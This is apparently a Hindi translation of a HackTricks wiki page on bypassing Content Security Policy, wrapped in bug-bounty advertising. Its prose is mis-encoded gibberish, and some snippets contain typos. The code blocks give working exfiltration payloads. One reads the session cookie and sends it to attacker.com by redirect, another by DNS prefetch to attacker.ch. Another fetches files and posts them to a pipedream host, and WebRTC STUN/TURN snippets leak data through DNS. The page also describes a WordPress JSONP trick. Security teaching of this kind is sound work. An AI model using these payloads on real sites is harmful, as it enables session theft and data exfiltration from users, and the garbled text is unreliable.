рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЙрдирдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ рд╡реЗрдм3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**рд╡реЗрдм3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

## рд╕реАрдПрд╕рдкреА рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рддрдХрдиреАрдХреЗрдВ

### PHP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдмрдлрд░ рдУрд╡рд░рд▓реЛрдб

PHP рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реИ рдХрд┐ рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ 4096 рдмрд╛рдЗрдЯ рддрдХ рдмрдлрд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ PHP рдПрдХ рдЪреЗрддрд╛рд╡рдиреА рджрд┐рдЦрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ **рдЪреЗрддрд╛рд╡рдирд┐рдпреЛрдВ рдХреЗ рдЕрдВрджрд░ рдкрд░реНрдпрд╛рдкреНрдд рдбреЗрдЯрд╛ рдкреНрд░рджрд╛рди рдХрд░рдХреЗ**, **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ **рд╕реАрдПрд╕рдкреА рд╣реИрдбрд░** рд╕реЗ **рдкрд╣рд▓реЗ** **рднреЗрдЬ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**, рдЬрд┐рд╕рд╕реЗ рд╣реИрдбрд░ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдлрд┐рд░, рддрдХрдиреАрдХ рдореВрд▓ рд░реВрдк рд╕реЗ **рдЪреЗрддрд╛рд╡рдирд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдмрдлрд░ рднрд░рдиреЗ** рдХрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реАрдПрд╕рдкреА рд╣реИрдбрд░ рди рднреЗрдЬрд╛ рдЬрд╛рдПред

рдпрд╣ рд╡рд┐рдЪрд╛рд░ [**рдЗрд╕ рд╡реНрд░рд╛рдЗрдЯрдЕрдк**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points) рд╕реЗ рд╣реИред

### рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдкреБрдирд░реНрд▓реЗрдЦрди

[**рдЗрд╕ рд╡реНрд░рд╛рдЗрдЯрдЕрдк**](https://blog.ssrf.kr/69) рд╕реЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╕реАрдПрд╕рдкреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда (рд╕рдВрднрд╡рддрдГ рд╕реАрдПрд╕рдкреА рдХреЗ рдмрд┐рдирд╛) рд▓реЛрдб рдХрд░рдиреЗ рдФрд░ рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреБрдирд░реНрд▓реЗрдЦрд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдереАред
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### рдХреБрдЫ + 'self' + рд╡рд░реНрдбрдкреНрд░реЗрд╕

рдХреБрдЫ рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рдПрдХ рдкреЗрдЬ рдХреЗ рдПрдХ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдореЗрдВ XSS (рдпрд╛ рдЕрддреНрдпрдВрдд рд╕реАрдорд┐рдд XSS) рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ рддрд╛рдХрд┐ рдЙрд╕реА рдореВрд▓ рд╕реНрд░реЛрдд рдХреЗ рдЕрдиреНрдп рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕реЗ рд╣рдорд▓реЗрдмрд╛рдЬрд╝ рдкреЗрдЬ рд╕реЗ рд╡рд┐рдХрд▓реНрдкреА рдПрдВрдбрдкреЙрдЗрдВрдЯ рд▓реЛрдб рдХрд░рдХреЗ рдФрд░ рдлрд┐рд░ рдЙрд╕реА рдореВрд▓ рд╕реНрд░реЛрдд рдореЗрдВ рд╣рдорд▓реЗрдмрд╛рдЬрд╝ рдкреЗрдЬ рдХреЛ рд░реАрдлрд╝реНрд░реЗрд╢ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ, рд╡рд┐рдХрд▓реНрдкреА рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ DOM рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдкреЗрдпрд▓реЛрдб рдореЗрдВ 'рдУрдкрдирд░' рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рд╡рд░реНрдбрдкреНрд░реЗрд╕** рдореЗрдВ `/wp-json/wp/v2/users/1?_jsonp=data` рдореЗрдВ рдПрдХ **JSONP** рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╣реИ рдЬреЛ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рднреЗрдЬреЗ рдЧрдП **рдбреЗрдЯрд╛** рдХреЛ **рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд** рдХрд░реЗрдЧрд╛ (рдХреЗрд╡рд▓ рдЕрдХреНрд╖рд░, рд╕рдВрдЦреНрдпрд╛ рдФрд░ рдбреЙрдЯ рдХреА рд╕реАрдорд╛ рдХреЗ рд╕рд╛рде).

рдПрдХ рд╣рдорд▓реЗрдмрд╛рдЬрд╝ рдЙрд╕ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд░реНрдбрдкреНрд░реЗрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл рдПрдХ рдХреБрдЫ рд╣рдорд▓рд╛ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рд▓реЛрдб рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ 'self' рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдФрд░ рдХреНрдпреЛрдВрдХрд┐ рд╡рд░реНрдбрдкреНрд░реЗрд╕ рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, рдПрдХ рд╣рдорд▓реЗрдмрд╛рдЬрд╝ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдзрд┐рдХ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ, рдПрдХ рдирдпрд╛ рдкреНрд▓рдЧрдЗрди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **CSP рдХреЛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг** **рдХреЙрд▓рдмреИрдХ** рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ...\
рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХреИрд╕реЗ рдХрд░реЗрдВ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

рдпрджрд┐ рдПрдХ рд╕рдЦреНрдд CSP рд╣реИ рдЬреЛ рдЖрдкрдХреЛ **рдмрд╛рд╣рд░реА рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ, рддреЛ рдЖрдк рдХреБрдЫ рдРрд╕реА рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдЖрдк рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕реНрдерд╛рди

рдЖрдк рдмрд╕ рд╕реНрдерд╛рди рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╣рдорд▓реЗрдмрд╛рдЬрд╝ рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬ рд╕рдХреЗрдВ:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### рдореЗрдЯрд╛ рдЯреИрдЧ

рдЖрдк рдПрдХ рдореЗрдЯрд╛ рдЯреИрдЧ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╣реИ, рдпрд╣ рд╕рд╛рдордЧреНрд░реА рдирд╣реАрдВ рд▓реАрдХ рдХрд░реЗрдЧрд╛)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS рдкреНрд░реАрдлреЗрдЪ

рдкреЗрдЬ рдХреЛ рддреЗрдЬреА рд╕реЗ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА IP рдкрддреЗ рдореЗрдВ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реА-рд░рд┐рдЬрд╝реЙрд▓реНрд╡ рдХрд░реЗрдЧрд╛ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдмрд╛рдж рдореЗрдВ рдХреИрд╢ рдХрд░реЗрдЧрд╛ред\
рдЖрдк рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд░рд┐рдЬрд╝реЙрд▓реНрд╡ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `<link reol="dns-prefetch" href="something.com">`

рдЖрдк рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **DNS рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ**:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
рдПрдХ рдФрд░ рддрд░реАрдХрд╛:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
рдЗрд╕рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд░ HTTP рд╣реЗрдбрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ:
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
рдЬрд╛рд╣рд┐рд░ рд╣реИ, рдпрд╣ рддрдХрдиреАрдХ headless рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ (рдмреЙрдЯ) рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреА рд╣реИред
{% endhint %}

### WebRTC

рдХрдИ рдкреЗрдЬреЛрдВ рдкрд░ рдЖрдк рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **WebRTC `connect-src` рдиреАрддрд┐** рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрдк рдПрдХ _DNS рдЕрдиреБрд░реЛрдз_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ _рд╡рд┐рд╕рд░реНрдЬрд┐рдд_ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## рдСрдирд▓рд╛рдЗрди CSP рдиреАрддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ CSP рдмрдирд╛рдирд╛

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## рд╕рдВрджрд░реНрдн

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)

тАЛ

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдХреЗ рд▓рд┐рдП рдШрд░ рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рдХреЗрд╡рд▓ рддрдм рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдкреБрд░рд╕реНрдХрд╛рд░ рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдмрдЧ рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЖрдкрдХреЛ рдкреБрд░рд╕реНрдХрд╛рд░ рдорд┐рд▓реЗрдЧрд╛ред

**рд╡реЗрдм3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЙрдирдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ рд╡реЗрдм3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**рд╡реЗрдм3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕** рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>
